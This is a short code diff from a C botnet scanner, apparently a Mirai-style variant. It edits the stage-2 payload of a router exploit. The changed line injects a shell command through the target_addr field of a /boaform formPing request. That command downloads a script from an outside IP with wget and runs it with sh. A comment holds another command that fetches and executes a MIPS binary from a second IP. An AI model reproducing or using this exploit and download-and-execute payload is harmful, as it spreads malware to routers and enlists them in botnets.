@@ -287,7 +287,7 @@ void netlink_scanner(void)
                         #endif
 
                         // build stage 2 payload  might needa change this payload format     cd /tmp; wget http://185.244.39.166/bins/666.mips; chmod 777 666.mips; ./666.mips NetLink.Rep
-                        util_strcpy(conn->payload_buf, "GET /boaform/admin/formPing?target_addr=;wget%20http://34.147.211.204/sora.sh%20-O%20-%3E%20/tmp/jno;sh%20/tmp/jno%27/&waninf=1_INTERNET_R_VID_154$ HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: Hello, World\r\n\r\n");
+                        util_strcpy(conn->payload_buf, "GET /boaform/admin/formPing?target_addr=;wget%20http://35.234.54.226/sora.sh%20-O%20-%3E%20/tmp/jno;sh%20/tmp/jno%27/&waninf=1_INTERNET_R_VID_154$ HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: Hello, World\r\n\r\n");
 
                         // actually send the payload
                         send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
